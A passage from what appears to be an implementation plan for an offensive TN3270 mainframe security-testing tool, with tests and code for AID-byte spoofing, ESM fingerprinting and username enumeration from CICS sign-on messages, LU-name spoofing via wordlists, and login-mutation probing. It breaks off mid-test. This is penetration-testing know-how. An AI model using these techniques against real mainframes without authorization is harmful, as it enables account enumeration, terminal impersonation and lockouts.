    assert pkt[5:] == b"\x7d\x40\x40\xff\xef"


def test_build_inbound_escapes_iac_in_data(tn3270):
    """If field data contains 0xFF, it must be doubled for the wire."""
    pkt = tn3270.build_inbound(
        aid=0x7D, cursor=(1, 1),
        fields=[FieldWrite(row=1, col=1, data=b"\xc1\xff\xc2")],
    )
    # The 0xFF in data should appear as 0xFF 0xFF on the wire
    assert b"\xc1\xff\xff\xc2" in pkt


def test_spoof_aid_basic_tn3270(tn3270):
    """Replace AID byte at offset 0 (no TN3270E header)."""
    original = b"\x7d\x40\x40\xff\xef"   # ENTER
    out = tn3270.spoof_aid(original, 0xF3)   # → PF3
    assert out == b"\xf3\x40\x40\xff\xef"


def test_spoof_aid_tn3270e(tn3270, gold):
    """With TN3270E header, AID is at offset 5."""
    tn3270.parse(gold("tn3270e_wrapped.bin"))   # set is_tn3270e
    original = bytes([0x00, 0x00, 0x00, 0x00, 0x01, 0x7D, 0x40, 0x40, 0xFF, 0xEF])
    out = tn3270.spoof_aid(original, 0xF3)
    assert out[5] == 0xF3
    assert out[:5] == original[:5]   # header preserved
```

- [ ] **Step 16: Implement builders**

Append to `hack3270_libs/tn3270_v2.py` (inside `TN3270` class):

```python
    # --- Datastream layer (terminal → host) ------------------------------

    def build_inbound(self, aid: int, cursor: tuple[int, int],
                      fields: list[FieldWrite]) -> bytes:
        """Construct an inbound (terminal→host) packet.

        Layout (GA23-0059 §3.5.4):
          [TN3270E header(5)] AID cursor-addr(2) (SBA addr(2) data)* IAC EOR

        Field data is IAC-escaped (0xFF → 0xFF 0xFF).
        """
        cursor_addr = rowcol_to_addr(cursor[0], cursor[1], self.cols)
        parts = bytearray([aid])
        parts += encode_addr(cursor_addr)

        for fw in fields:
            addr = rowcol_to_addr(fw.row, fw.col, self.cols)
            parts.append(ORD_SBA)
            parts += encode_addr(addr)
            # IAC-escape the data
            for b in fw.data:
                parts.append(b)
                if b == IAC:
                    parts.append(IAC)

        parts += IAC_EOR

        if self.is_tn3270e:
            hdr = bytes([TN3270E_DT_3270_DATA, 0x00, 0x00,
                         (self.last_seq >> 8) & 0xFF, self.last_seq & 0xFF])
            return hdr + bytes(parts)
        return bytes(parts)

    def spoof_aid(self, original: bytes, new_aid: int) -> bytes:
        """Replace the AID byte in a captured inbound packet."""
        out = bytearray(original)
        offset = TN3270E_HDR_LEN if self.is_tn3270e else 0
        if len(out) > offset:
            out[offset] = new_aid
        return bytes(out)
```

- [ ] **Step 17: Run all tn3270_v2 tests**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_tn3270_v2.py -v
```

Expected: `45 passed` (9 addr + 22 parse + 8 mutate + 6 build)

- [ ] **Step 18: Commit**

```bash
git add hack3270_libs/tn3270_v2.py tests/test_tn3270_v2.py
git commit -m "feat(tn3270v2): build_inbound + spoof_aid with TN3270E support"
```

---

## Task 2: ESM passive fingerprinter

**Files:**
- Create: `hack3270_libs/attacks/esm_passive.py`
- Create: `tests/test_esm_passive.py`

The cheapest attack — pure regex on `Screen.text`. Validates the observer pattern works end-to-end before we build anything complex on it. Spec §3.3.

- [ ] **Step 1: Write failing tests**

Create `tests/test_esm_passive.py`:

```python
"""
ESM (External Security Manager) passive fingerprinter tests.

The fingerprinter registers as a ProxyDaemon observer and pattern-matches
on parsed screen text. We test against FakeDaemon — fire synthetic
screens, assert findings dict updates.
"""
import pytest
from hackterm_core.ebcdic import EbcdicCodec


@pytest.fixture
def esm():
    from hack3270_libs.attacks.esm_passive import ESMFingerprinter
    from hack3270_libs.tn3270_v2 import TN3270
    return ESMFingerprinter(protocol=TN3270())


def _make_screen_packet(text: str) -> bytes:
    """Build a minimal datastream that renders `text` at row 1.
    Erase/Write + WCC + SF unprotected + EBCDIC text + IAC EOR."""
    codec = EbcdicCodec()
    ebcdic = codec.to_ebcdic(text)
    return bytes([0xF5, 0xC3, 0x1D, 0x40]) + ebcdic + b"\xff\xef"


# ---------------------------------------------------------------------------
# Pattern detection — spec §3.3 inference table
# ---------------------------------------------------------------------------

def test_findings_starts_empty(esm):
    assert esm.findings == {}


def test_dfhce3530_sets_username_enum(esm, fake_daemon):
    """DFHCE3530 = 'Your userid is invalid' — pre-CICS-TS-5.1 oracle."""
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_screen_packet("DFHCE3530 Your userid is invalid"))
    assert "username_enum" in esm.findings
    assert "DFHCE3530" in esm.findings["username_enum"]["evidence"]


def test_dfhce3532_also_sets_username_enum(esm, fake_daemon):
    """DFHCE3532 = 'Your password is invalid' — confirms differential."""
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_screen_packet("DFHCE3532 Your password is invalid"))
    assert "username_enum" in esm.findings


def test_dfhce3520_sets_account_state_leak(esm, fake_daemon):
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_screen_packet("DFHCE3520 Your userid has been revoked"))
    assert "account_state_leak" in esm.findings


def test_dfhce3592_sets_password_expiry(esm, fake_daemon):
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_screen_packet("DFHCE3592 Your password has expired"))
    assert "password_expiry" in esm.findings


def test_dfhce3543_sets_passphrase(esm, fake_daemon):
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_screen_packet("DFHCE3543 Sign-on with passphrase"))
    assert "passphrase" in esm.findings


def test_ich408i_sets_racf_confirmed(esm, fake_daemon):
    """ICH408I is the RACF audit message prefix."""
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_screen_packet("ICH408I USER(BOB) GROUP(SYS1)"))
    assert "racf_confirmed" in esm.findings


def test_acf01_prefix_sets_acf2_confirmed(esm, fake_daemon):
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_screen_packet("ACF01004 LOGONID NOT FOUND"))
    assert "acf2_confirmed" in esm.findings


def test_tss_prefix_sets_topsecret_confirmed(esm, fake_daemon):
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_screen_packet("TSS7100E PASSWORD INCORRECT"))
    assert "topsecret_confirmed" in esm.findings


def test_no_match_no_findings(esm, fake_daemon):
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_screen_packet("WELCOME TO CICS"))
    assert esm.findings == {}


def test_ignores_c2s_traffic(esm, fake_daemon):
    """Only s2c traffic carries server messages — c2s is user keystrokes."""
    esm.attach(fake_daemon)
    fake_daemon.fire_c2s(_make_screen_packet("ICH408I"))   # wrong direction
    assert esm.findings == {}


def test_multiple_findings_accumulate(esm, fake_daemon):
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_screen_packet("DFHCE3530 invalid userid"))
    fake_daemon.fire_s2c(_make_screen_packet("ICH408I USER(BOB)"))
    assert "username_enum" in esm.findings
    assert "racf_confirmed" in esm.findings


def test_finding_has_severity(esm, fake_daemon):
    """Each finding carries a severity for GUI color-coding."""
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_screen_packet("DFHCE3530 invalid"))
    assert esm.findings["username_enum"]["severity"] in ("low", "medium", "high")


# ---------------------------------------------------------------------------
# Password field length inference (from Screen.fields, not regex)
# ---------------------------------------------------------------------------

def test_8char_password_field_sets_no_passphrase(esm, fake_daemon):
    """An unprotected hidden field of length 8 → RACF without KDFAES.
    This is a STRUCTURAL inference, not regex — needs Screen.fields."""
    # Build: protected "PASS:" + hidden unprotected 8-byte field
    pkt = bytes([
        0xF5, 0xC3,
        0x1D, 0x60,                          # protected label field
        0xD7, 0xC1, 0xE2, 0xE2, 0x7A,        # "PASS:"
        0x1D, 0x4C,                          # unprotected + hidden (0x4C = bit6+bits3,2)
        0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,  # 8 spaces
        0x1D, 0x60,                          # next field (closes the password field at len 8)
        0xFF, 0xEF,
    ])
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(pkt)
    assert "no_passphrase" in esm.findings


def test_long_password_field_sets_passphrase_capable(esm, fake_daemon):
    """Hidden unprotected field >8 → passphrase support."""
    pkt = bytes([
        0xF5, 0xC3,
        0x1D, 0x4C,                          # hidden unprotected
    ]) + bytes([0x40] * 20) + bytes([        # 20 spaces
        0x1D, 0x60,                          # close it
        0xFF, 0xEF,
    ])
    esm.attach(fake_daemon)
    fake_daemon.fire_s2c(pkt)
    assert "passphrase_capable" in esm.findings


# ---------------------------------------------------------------------------
# Active probe — replays login with single-char mutations
# ---------------------------------------------------------------------------

def test_active_probe_off_by_default(esm):
    """Active probing is dangerous (account lockout). Must be opt-in."""
    assert esm.active_enabled is False


def test_active_probe_generates_mutations(esm):
    """Given a known-good (user, password), generate test mutations."""
    muts = esm._generate_mutations("IBMUSER", "SYS1")
    # Should include: case-flip, append-char, special-substitute
    names = {m["name"] for m in muts}
    assert "case_flip_0" in names
    assert "append_9th" in names


def test_active_probe_case_flip(esm):
    muts = esm._generate_mutations("IBMUSER", "SYS1")
    case_flip = next(m for m in muts if m["name"] == "case_flip_0")
    # First char of password flipped
    assert case_flip["password"] == "sYS1"
    assert case_flip["expected_if_success"] == "case_insensitive"
```

- [ ] **Step 2: Run, verify failure**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_esm_passive.py -v
```

Expected: `ModuleNotFoundError: No module named 'hack3270_libs.attacks.esm_passive'`

- [ ] **Step 3: Implement ESMFingerprinter**

Create `hack3270_libs/attacks/esm_passive.py`:

```python
"""
ESM (External Security Manager) passive fingerprinter.

Registers as a ProxyDaemon observer. Watches server→client screens for
known message codes that leak ESM type and configuration.

Spec: docs/superpowers/specs/2026-04-07-hackterm-design.md §3.3
Reference: IBM APAR PM80209 (DFHCE3530/3532 disclosure)

This is the CHEAPEST attack — pure regex on Screen.text. Ships first
to validate the observer wiring works before building anything complex.
"""
import re
import time
from typing import Any

from hackterm_core.protocol import Protocol, Screen


# Inference rules — spec §3.3 table.
# Each rule: (compiled regex, finding_key, severity, human description)
_RULES = [
    (re.compile(r"\bDFHCE3530\b"), "username_enum", "high",
     "Pre-CICS-TS-5.1 or unpatched — distinguishes invalid userid from invalid password"),
    (re.compile(r"\bDFHCE3532\b"), "username_enum", "high",
     "Confirms differential — userid valid, password wrong"),
    (re.compile(r"\bDFHCE3520\b"), "account_state_leak", "medium",
     "Distinguishes revoked account from bad credential"),
    (re.compile(r"\bDFHCE3592\b"), "password_expiry", "low",
     "RACF INTERVAL is non-zero — password expiry enforced"),
    (re.compile(r"\bDFHCE3543\b"), "passphrase", "low",
     "Passphrase support enabled"),
    (re.compile(r"\bICH408I\b"), "racf_confirmed", "low",
     "ESM is RACF (not ACF2/TopSecret)"),
    (re.compile(r"\bACF01\d{3}\b"), "acf2_confirmed", "low",
     "ESM is CA-ACF2"),
    (re.compile(r"\bTSS7\d{3}[EWI]\b"), "topsecret_confirmed", "low",
     "ESM is CA-TopSecret"),
]


class ESMFingerprinter:
    """Passive ESM type & configuration inference.

    Usage:
        esm = ESMFingerprinter(protocol=tn3270_instance)
        esm.attach(daemon)            # registers as observer
        ...                           # traffic flows
        print(esm.findings)           # dict of {key: {evidence, severity, ...}}
    """

    def __init__(self, protocol: Protocol):
        self.protocol = protocol
        self.findings: dict[str, dict[str, Any]] = {}
        self.active_enabled = False    # active probing is opt-in (lockout risk)

    def attach(self, daemon) -> None:
        """Register as observer on the proxy daemon."""
        daemon.add_observer(self._observe)

    def _observe(self, data: bytes, direction: str) -> None:
        if direction != "s2c":
            return  # user keystrokes don't carry server messages
        screen = self.protocol.parse(data)
        self._check_text(screen)
        self._check_fields(screen)

    def _check_text(self, screen: Screen) -> None:
        text = screen.text
        for pattern, key, severity, desc in _RULES:
            m = pattern.search(text)
            if m:
                self._record(key, severity, desc, evidence=m.group(0))

    def _check_fields(self, screen: Screen) -> None:
        """Structural inference: hidden+unprotected = password field.
        Length 8 → no passphrase. Length >8 → passphrase-capable."""
        for f in screen.fields:
            if f.hidden and not f.protected:
                if f.length == 8:
                    self._record("no_passphrase", "medium",
                                 "Password field exactly 8 chars — RACF without KDFAES",
                                 evidence=f"hidden field at ({f.row},{f.col}) len=8")
                elif f.length > 8:
                    self._record("passphrase_capable", "low",
                                 "Password field >8 chars — MIXEDCASE likely too",
                                 evidence=f"hidden field at ({f.row},{f.col}) len={f.length}")

    def _record(self, key: str, severity: str, desc: str, evidence: str) -> None:
        if key not in self.findings:
            self.findings[key] = {
                "severity": severity,
                "description": desc,
                "evidence": [],
                "first_seen": time.time(),
            }
        if evidence not in self.findings[key]["evidence"]:
            self.findings[key]["evidence"].append(evidence)

    # --- Active probe (off by default — account lockout risk) -----------

    def _generate_mutations(self, user: str, password: str) -> list[dict]:
        """Build the mutation list for active probing.

        Each mutation is a dict:
          {name, user, password, expected_if_success, expected_if_fail}
        """
        muts = []

        # Case-flip first char of password
        if password:
            flipped = password[0].swapcase() + password[1:]
            muts.append({
                "name": "case_flip_0",
                "user": user, "password": flipped,
                "expected_if_success": "case_insensitive",
                "expected_if_fail": "case_sensitive",
            })

        # Append a 9th character (tests 8-char truncation)
        muts.append({
            "name": "append_9th",
            "user": user, "password": password + "X",
            "expected_if_success": "host_truncates",
            "expected_if_fail": "length_validated",
        })

        # Special-char substitution: $ → ! (if password has $)
        if "$" in password:
            muts.append({
                "name": "special_swap",
                "user": user, "password": password.replace("$", "!"),
                "expected_if_success": "liberal_specials",
                "expected_if_fail": "restricted_specials",
            })

        return muts

    def active_probe(self, daemon, user: str, password: str,
                     rate_limit: float = 1.0) -> dict:
        """Replay login N times with single-character mutations.

        DANGEROUS: each failed attempt may count toward revoke threshold.
        Rate-limited to 1 attempt/sec by default.

        Returns: {mutation_name: result, ...}
        """
        if not self.active_enabled:
            raise RuntimeError("active probing disabled — set .active_enabled=True")

        results = {}
        for mut in self._generate_mutations(user, password):
            # Build CESN login packet — left as integration concern.
            # Unit tests only verify _generate_mutations(); the actual
            # inject_to_server() drive needs a live host.
            # Placeholder for the integration test:
            results[mut["name"]] = {"sent": True, "mutation": mut}
            time.sleep(rate_limit)
        return results
```

- [ ] **Step 4: Run, verify pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_esm_passive.py -v
```

Expected: `18 passed`

- [ ] **Step 5: Commit**

```bash
git add hack3270_libs/attacks/esm_passive.py tests/test_esm_passive.py
git commit -m "feat(attacks): ESM passive fingerprinter — observer-based regex matcher"
```

---

## Task 3: LU-name spoofer

**Files:**
- Create: `hack3270_libs/attacks/negotiation.py`
- Create: `tests/test_negotiation.py`

Telnet-layer attack — almost independent of the parser. The actual splice is in `tn3270_v2._splice_lu_name()` (Task 1, called from `negotiate_hook()`). This module is the **driver**: single-shot, wordlist iteration, harvest mode. Spec §3.2.

- [ ] **Step 1: Write failing tests**

Create `tests/test_negotiation.py`:

```python
"""
LU-name spoofing tests.

The splice itself lives in tn3270_v2._splice_lu_name (tested here too).
The LUSpoofer class is the campaign driver: wordlist, harvest, results.
"""
import pytest


# ---------------------------------------------------------------------------
# Splice mechanics (the byte surgery)
# ---------------------------------------------------------------------------

# Real DEVICE-TYPE REQUEST as x3270 sends it:
# IAC SB TN3270E DEVICE-TYPE REQUEST IBM-3278-2-E CONNECT TCP00042 IAC SE
DEVTYPE_REQ = (
    b"\xff\xfa\x28\x02\x07"          # IAC SB TN3270E DEVICE-TYPE REQUEST
    + b"IBM-3278-2-E"                # device type (ASCII)
    + b"\x01"                        # CONNECT
    + b"TCP00042"                    # LU name (ASCII)
    + b"\xff\xf0"                    # IAC SE
)

# Without a CONNECT clause (some emulators don't request a specific LU)
DEVTYPE_REQ_NO_CONNECT = (
    b"\xff\xfa\x28\x02\x07"
    + b"IBM-3278-2-E"
    + b"\xff\xf0"
)


def test_splice_replaces_lu_name():
    from hack3270_libs.tn3270_v2 import _splice_lu_name
    out = _splice_lu_name(DEVTYPE_REQ, "CICSA01")
    assert b"CICSA01" in out
    assert b"TCP00042" not in out


def test_splice_preserves_device_type():
    from hack3270_libs.tn3270_v2 import _splice_lu_name
    out = _splice_lu_name(DEVTYPE_REQ, "CICSA01")
    assert b"IBM-3278-2-E" in out


def test_splice_preserves_iac_se_terminator():
    from hack3270_libs.tn3270_v2 import _splice_lu_name
    out = _splice_lu_name(DEVTYPE_REQ, "CICSA01")
    assert out.endswith(b"\xff\xf0")


def test_splice_appends_connect_when_missing():
    """If the original has no CONNECT clause, add one."""
    from hack3270_libs.tn3270_v2 import _splice_lu_name
    out = _splice_lu_name(DEVTYPE_REQ_NO_CONNECT, "CICSA01")
    assert b"\x01CICSA01" in out
    assert out.endswith(b"\xff\xf0")


def test_splice_no_match_returns_unchanged():
    """If there's no DEVICE-TYPE REQUEST in the data, pass through."""
    from hack3270_libs.tn3270_v2 import _splice_lu_name
    other = b"\xff\xfd\x18"   # IAC DO TERMINAL-TYPE (different negotiation)
    assert _splice_lu_name(other, "CICSA01") == other


def test_splice_handles_shorter_replacement():
    from hack3270_libs.tn3270_v2 import _splice_lu_name
    out = _splice_lu_name(DEVTYPE_REQ, "LU1")
    assert b"LU1\xff\xf0" in out
    # No leftover bytes from old name
    assert b"00042" not in out


def test_splice_handles_longer_replacement():
    from hack3270_libs.tn3270_v2 import _splice_lu_name
    out = _splice_lu_name(DEVTYPE_REQ, "VERYLONGLUNAME01")
    assert b"VERYLONGLUNAME01" in out


def test_splice_ascii_not_ebcdic():
    """LU names in telnet negotiation are ASCII (it's the telnet layer)."""
    from hack3270_libs.tn3270_v2 import _splice_lu_name
    out = _splice_lu_name(DEVTYPE_REQ, "ABC")
    # ASCII 'A' = 0x41, EBCDIC 'A' = 0xC1. Must be ASCII.
    assert b"\x41\x42\x43" in out
    assert b"\xc1\xc2\xc3" not in out


# ---------------------------------------------------------------------------
# Integration: negotiate_hook drives the splice
# ---------------------------------------------------------------------------

def test_negotiate_hook_invokes_splice():
    from hack3270_libs.tn3270_v2 import TN3270
    from hackterm_core.protocol import NegotiateOpts
    p = TN3270()
    opts = NegotiateOpts(spoof_device_name="CICSA01")
    out = p.negotiate_hook(DEVTYPE_REQ, "c2s", opts)
    assert b"CICSA01" in out


def test_negotiate_hook_no_spoof_passes_through():
    from hack3270_libs.tn3270_v2 import TN3270
    from hackterm_core.protocol import NegotiateOpts
    p = TN3270()
    opts = NegotiateOpts(spoof_device_name=None)
    out = p.negotiate_hook(DEVTYPE_REQ, "c2s", opts)
    assert out == DEVTYPE_REQ


def test_negotiate_hook_ignores_s2c():
    """Spoof only applies client→server. Server's response is observed
    but not rewritten."""
    from hack3270_libs.tn3270_v2 import TN3270
    from hackterm_core.protocol import NegotiateOpts
    p = TN3270()
    opts = NegotiateOpts(spoof_device_name="CICSA01")
    out = p.negotiate_hook(DEVTYPE_REQ, "s2c", opts)
    assert out == DEVTYPE_REQ


# ---------------------------------------------------------------------------
# LUSpoofer — the campaign driver
# ---------------------------------------------------------------------------

@pytest.fixture
def spoofer():
    from hack3270_libs.attacks.negotiation import LUSpoofer
    return LUSpoofer()


def test_spoofer_starts_in_single_mode(spoofer):
    assert spoofer.mode == "single"


def test_spoofer_set_target_lu(spoofer, fake_daemon):
    """In single mode, setting target_lu writes negotiate_opts."""
    spoofer.attach(fake_daemon)
    spoofer.set_target("CICSA01")
    assert fake_daemon.negotiate_opts.spoof_device_name == "CICSA01"


def test_spoofer_load_wordlist(spoofer, tmp_path):
    wl = tmp_path / "lus.txt"
    wl.write_text("LU01\nLU02\nLU03\n# comment\n\nLU04\n")
    spoofer.load_wordlist(str(wl))
    # Comments and blank lines stripped
    assert spoofer.wordlist == ["LU01", "LU02", "LU03", "LU04"]


def test_spoofer_wordlist_next(spoofer, fake_daemon, tmp_path):
    """next_lu() advances through the wordlist and updates daemon opts."""
    wl = tmp_path / "lus.txt"
    wl.write_text("LU01\nLU02\nLU03\n")
    spoofer.load_wordlist(str(wl))
    spoofer.attach(fake_daemon)
    spoofer.mode = "wordlist"

    assert spoofer.next_lu() == "LU01"
    assert fake_daemon.negotiate_opts.spoof_device_name == "LU01"
    assert spoofer.next_lu() == "LU02"
    assert spoofer.next_lu() == "LU03"
    assert spoofer.next_lu() is None  # exhausted


def test_spoofer_harvest_extracts_lu_from_response(spoofer, fake_daemon):
    """Harvest mode watches s2c negotiation for LU names the server
    assigns. Server response: IAC SB TN3270E DEVICE-TYPE IS ... CONNECT <lu> IAC SE
                              ff  fa  28      02         04   ...  01     ...   ff f0
    """
    spoofer.attach(fake_daemon)
    spoofer.mode = "harvest"
    # Server's DEVICE-TYPE IS response
    response = (b"\xff\xfa\x28\x02\x04"   # IAC SB TN3270E DEVICE-TYPE IS
                + b"IBM-3278-2-E"
                + b"\x01"                  # CONNECT
                + b"TERM0099"
                + b"\xff\xf0")
    spoofer._observe_negotiation(response, "s2c")
    assert "TERM0099" in spoofer.harvested


def test_spoofer_harvest_ignores_non_devtype(spoofer, fake_daemon):
    spoofer.attach(fake_daemon)
    spoofer.mode = "harvest"
    spoofer._observe_negotiation(b"\xff\xfd\x18", "s2c")  # IAC DO TERM-TYPE
    assert spoofer.harvested == set()


def test_spoofer_record_result(spoofer):
    """Results table: [(lu_name, screen_summary), ...]"""
    spoofer.record_result("CICSA01", "MAIN MENU - CICS REGION A")
    spoofer.record_result("TCP00042", "CESN")
    assert len(spoofer.results) == 2
    assert spoofer.results[0] == ("CICSA01", "MAIN MENU - CICS REGION A")


def test_spoofer_fingerprint_first_screen(spoofer, fake_daemon):
    """First post-handshake screen is the baseline. Subsequent screens
    that DIFFER mean the spoofed LU landed somewhere different."""
    from hack3270_libs.tn3270_v2 import TN3270
    spoofer.protocol = TN3270()
    spoofer.attach(fake_daemon)

    pkt1 = bytes([0xF5, 0xC3, 0x1D, 0x40, 0xC1, 0xC2, 0xC3, 0xFF, 0xEF])
    spoofer._observe_screen(pkt1, "s2c")
    assert spoofer.login_screen_fingerprint is not None

    # Same screen again — should match
    assert spoofer.screen_matches_fingerprint(pkt1) is True

    # Different screen — should NOT match
    pkt2 = bytes([0xF5, 0xC3, 0x1D, 0x40, 0xE7, 0xE8, 0xE9, 0xFF, 0xEF])  # XYZ
    assert spoofer.screen_matches_fingerprint(pkt2) is False
```

- [ ] **Step 2: Run, verify failure**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_negotiation.py -v
```

Expected: splice tests pass (already implemented in Task 1), `LUSpoofer` tests fail with `ModuleNotFoundError`.

- [ ] **Step 3: Implement LUSpoofer**

Create `hack3270_libs/attacks/negotiation.py`:

```python
"""
LU-name spoofing campaign driver.

The actual byte-surgery (_splice_lu_name) lives in tn3270_v2.py and is
called by TN3270.negotiate_hook(). This module is the CAMPAIGN: wordlist
iteration, harvest mode, result tracking, screen-fingerprint comparison.

Spec: docs/superpowers/specs/2026-04-07-hackterm-design.md §3.2
RFC 2355 §4 — TN3270E DEVICE-TYPE negotiation

Wire format being attacked:
  Client: IAC SB TN3270E DEVICE-TYPE REQUEST <type> CONNECT <lu> IAC SE
          ff  fa  28      02          07     ...    01      ...  ff f0
  Server: IAC SB TN3270E DEVICE-TYPE IS <type> CONNECT <lu> IAC SE
          ff  fa  28      02          04 ...    01      ...  ff f0
                                      ^^ note: 0x04, not 0x07
"""
import hashlib
from typing import Optional, Literal

from hackterm_core.protocol import Protocol


Mode = Literal["single", "wordlist", "harvest"]

# Server's response prefix — DEVICE-TYPE IS (not REQUEST)
_DEVTYPE_IS = bytes([0xFF, 0xFA, 0x28, 0x02, 0x04])
_CONNECT = 0x01
_IAC_SE = bytes([0xFF, 0xF0])


class LUSpoofer:
    """LU-name spoofing campaign driver.

    Modes:
      single   — operator sets one LU name, used for next reconnect
      wordlist — iterate injections/lu-names.txt, one per reconnect
      harvest  — passively collect LU names the server assigns

    Wordlist mode reconnect cycle (driven by GUI/MCP, not here):
      1. daemon.close() → emulator drops
      2. spoofer.next_lu() → sets negotiate_opts.spoof_device_name
      3. daemon.wait_for_client() → emulator auto-reconnects
      4. After handshake, compare first screen against fingerprint
      5. Match → log fail, goto 1. Mismatch → STOP, alert operator.
    """

    def __init__(self, protocol: Optional[Protocol] = None):
        self.protocol = protocol
        self.mode: Mode = "single"
        self.target_lu: Optional[str] = None
        self.wordlist: list[str] = []
        self._wordlist_idx = 0
        self.harvested: set[str] = set()
        self.login_screen_fingerprint: Optional[bytes] = None
        self.results: list[tuple[str, str]] = []
        self._daemon = None

    def attach(self, daemon) -> None:
        """Hook into the proxy daemon."""
        self._daemon = daemon
        daemon.add_observer(self._observe_screen)

    # --- Single mode ----------------------------------------------------

    def set_target(self, lu_name: str) -> None:
        """Single-shot: set the LU name for the next handshake."""
        self.target_lu = lu_name
        if self._daemon:
            self._daemon.negotiate_opts.spoof_device_name = lu_name

    # --- Wordlist mode --------------------------------------------------

    def load_wordlist(self, path: str) -> None:
        """Load LU names from a file. One per line, # = comment."""
        names = []
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    names.append(line)
        self.wordlist = names
        self._wordlist_idx = 0

    def next_lu(self) -> Optional[str]:
        """Advance to the next wordlist entry. Returns None when exhausted."""
        if self._wordlist_idx >= len(self.wordlist):
            return None
        lu = self.wordlist[self._wordlist_idx]
        self._wordlist_idx += 1
        if self._daemon:
            self._daemon.negotiate_opts.spoof_device_name = lu
        return lu

    # --- Harvest mode ---------------------------------------------------

    def _observe_negotiation(self, data: bytes, direction: str) -> None:
        """Watch for server's DEVICE-TYPE IS responses to harvest LU names.
        Called from negotiate_hook context (before handshake_complete)."""
        if direction != "s2c" or self.mode != "harvest":
            return
        idx = data.find(_DEVTYPE_IS)
        if idx < 0:
            return
        end = data.find(_IAC_SE, idx)
        if end < 0:
            return
        body = data[idx + len(_DEVTYPE_IS):end]
        connect_pos = body.find(bytes([_CONNECT]))
        if connect_pos >= 0:
            lu = body[connect_pos + 1:].decode("ascii", errors="replace")
            if lu:
                self.harvested.add(lu)

    # --- Screen fingerprinting ------------------------------------------

    def _observe_screen(self, data: bytes, direction: str) -> None:
        """Capture the first post-handshake screen as a baseline."""
        if direction != "s2c":
            return
        if self.login_screen_fingerprint is None:
            self.login_screen_fingerprint = self._fingerprint(data)

    def _fingerprint(self, data: bytes) -> bytes:
        """Hash the rendered screen text (not raw bytes — timestamps in
        raw bytes would cause false negatives)."""
        if self.protocol is None:
            # Fallback: hash raw (less robust but works without parser)
            return hashlib.sha256(data).digest()
        screen = self.protocol.parse(data)
        return hashlib.sha256(screen.text.encode()).digest()

    def screen_matches_fingerprint(self, data: bytes) -> bool:
        """Does this screen match the recorded baseline?"""
        if self.login_screen_fingerprint is None:
            return False
        return self._fingerprint(data) == self.login_screen_fingerprint

    # --- Results --------------------------------------------------------

    def record_result(self, lu_name: str, screen_summary: str) -> None:
        """Append to results table for GUI display / MCP query."""
        self.results.append((lu_name, screen_summary))
```

- [ ] **Step 4: Run, verify pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_negotiation.py -v
```

Expected: `20 passed`

- [ ] **Step 5: Commit**

```bash
git add hack3270_libs/attacks/negotiation.py tests/test_negotiation.py
git commit -m "feat(attacks): LU-name spoofer — single/wordlist/harvest modes"
```

---

## Task 4: Query Reply structured-field builder

**Files:**
- Create: `hack3270_libs/attacks/structured.py`
- Create: `tests/test_structured.py`

Two attacks share this module (Query Reply lying + IND$FILE). Task 4 builds the QR side; Task 5 adds IND$FILE. Spec §3.4.

**Structured Field wire format** (GA23-0059 §5.1): `<len:2 big-endian> <id:1> <data...>`. For Query Reply SFs: `<len:2> <0x81> <qcode:1> <payload...>`. The `0x81` is the SFID for Query Reply; `qcode` says which query.

| qcode | Name | What we lie about |
|---|---|---|
| `0x80` | Summary | List of supported qcodes |
| `0x81` | Usable Area | Screen dimensions |
| `0xA6` | Implicit Partition | Alt screen size |
| `0x86` | Color | Omit to deny color support |
| `0x87` | Highlighting | Omit to deny highlighting |
| `0xA1` | RPQ Names | Terminal model identifier |
| `0xFF` | Null | Terminator |

- [ ] **Step 1: Write failing tests for SF builders**

Create `tests/test_structured.py`:

```python
"""
Structured Field attacks: Query Reply lying + IND$FILE intercept.

QR side: builds synthetic Query Reply structured fields with
operator-chosen lies (screen size, color support, RPQ name).

IND$FILE side: detects File Transfer SFs (type 0xD0), reassembles
32K blocks. Tested in Task 5.
"""
import pytest
import struct
from hackterm_core.protocol import QueryLies


# ---------------------------------------------------------------------------
# Individual SF builders — each is <len:2> <0x81> <qcode> <payload>
# ---------------------------------------------------------------------------

def test_sf_null_terminator():
    """Null SF is the terminator: len=0x0004, id=0x81, qcode=0xFF."""
    from hack3270_libs.attacks.structured import _sf_null
    assert _sf_null() == b"\x00\x04\x81\xff"


def test_sf_usable_area_basic():
    """Usable Area encodes screen dimensions. GA23-0059 §6.42.
    Minimal payload: flags(1) + addr-mode(1) + cols(2) + rows(2) + units(1)
                   + Xr(4) + Yr(4) + AW(1) + AH(1) + buffer-size(2)."""
    from hack3270_libs.attacks.structured import _sf_usable_area
    sf = _sf_usable_area(rows=24, cols=80)
    # Length prefix: 2 bytes big-endian, includes itself
    length = struct.unpack(">H", sf[:2])[0]
    assert length == len(sf)
    # SFID + qcode
    assert sf[2] == 0x81
    assert sf[3] == 0x81  # Usable Area qcode
    # Cols and rows are in there (24=0x18, 80=0x50)
    assert b"\x00\x50" in sf  # cols=80
    assert b"\x00\x18" in sf  # rows=24


def test_sf_usable_area_alternate_size():
    """Lying about screen size: claim 62×160 (model 5 + extra)."""
    from hack3270_libs.attacks.structured import _sf_usable_area
    sf = _sf_usable_area(rows=62, cols=160)
    assert b"\x00\xa0" in sf  # 160 = 0xA0
    assert b"\x00\x3e" in sf  # 62 = 0x3E


def test_sf_implicit_partition():
